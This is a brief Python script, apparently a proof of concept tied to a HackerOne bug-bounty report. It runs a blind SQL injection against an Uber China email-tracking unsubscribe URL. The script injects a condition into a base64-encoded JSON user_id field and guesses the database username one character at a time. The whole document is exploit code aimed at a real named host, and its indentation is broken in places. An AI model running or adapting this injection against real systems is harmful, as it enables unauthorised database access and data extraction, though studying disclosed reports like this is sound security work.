# https://hackerone.com/reports/150156

import json
import string
import requests

from urllib import quote
from base64 import b64encode
    base = string.digits + string.letters + '_-@.' # characters used as database username/hostname
    payload = {"user_id":5744,"receiver":"blog.orange.tw"}
    for I in range(0,30):  # for 0 < user()'s length < 30
        for i in base:
            payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(I+1,i)
                new_payload = json.dumps(payload)
                new_payload = b64encode(new_payload)
                r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?\p='+quote(new_payload))
                if len(r.content)>0:
                    print i,
                    break
